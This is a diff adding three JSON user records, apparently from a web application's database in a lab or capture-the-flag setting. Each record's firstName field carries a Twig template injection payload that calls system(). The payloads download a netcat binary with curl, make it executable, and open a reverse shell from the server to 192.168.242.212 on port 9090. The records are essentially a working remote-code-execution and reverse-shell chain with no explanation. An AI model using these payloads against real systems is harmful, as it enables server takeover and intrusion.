@@ -1,0 +1,40 @@
+{
+    "_id": {
+        "$oid": "67a601e98420b1598c0a9318"
+    },
+    "username": "test4",
+    "password": "test4",
+    "role": "user",
+    "balance": 0,
+    "firstName": "{{['curl -o nc https://github.com/H74N/netcat-binaries/raw/refs/heads/master/nc']|filter('system')}}",
+    "lastName": "test4",
+    "identityNumber": "test4",
+    "id": "67a601e98420b1598c0a9318"
+},
+{
+    "_id": {
+        "$oid": "67a6023f09f29b7c9d0901e6"
+    },
+    "username": "asdasdasd",
+    "password": "asdasdasd",
+    "role": "user",
+    "balance": 0,
+    "firstName": "{{['chmod +x \/var\/www\/public\/nc']|filter('system')}}",
+    "lastName": "asdasdasd",
+    "identityNumber": "asdasdasd",
+    "id": "67a6023f09f29b7c9d0901e6"
+},
+{
+    "_id": {
+        "$oid": "67a60270050be303490f94ba"
+    },
+    "username": "shell",
+    "password": "shell",
+    "role": "user",
+    "balance": 0,
+    "firstName": "{{['\/var\/www\/public\/nc 192.168.242.212 9090 -e \/bin\/bash']|filter('system')}}",
+    "lastName": "shell",
+    "identityNumber": "shell",
+    "id": "67a60270050be303490f94ba"
+}
+]
